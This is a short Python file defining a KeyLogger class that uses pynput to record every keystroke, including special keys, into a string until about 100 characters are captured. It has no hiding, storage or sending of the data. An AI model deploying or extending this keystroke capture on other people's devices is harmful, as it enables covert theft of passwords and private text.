from pynput.keyboard import Key, Listener, KeyCode

class KeyLogger:
    def __init__(self) -> None:
        self.listener = Listener(on_press=self.onPress, on_release=self.onRelease)
        self.string = ''

    def onPress(self, key: Key | KeyCode) -> None:
        try:
            self.string += f'{key.char}'
            
        except AttributeError:
            self.string += f'\n{key}\n'

    def onRelease(self, key: Key | KeyCode) -> bool:
        if len(self.string) > 100: 
            return False
        return True


    def start(self) -> None:
        with self.listener as listener:
            listener.join()


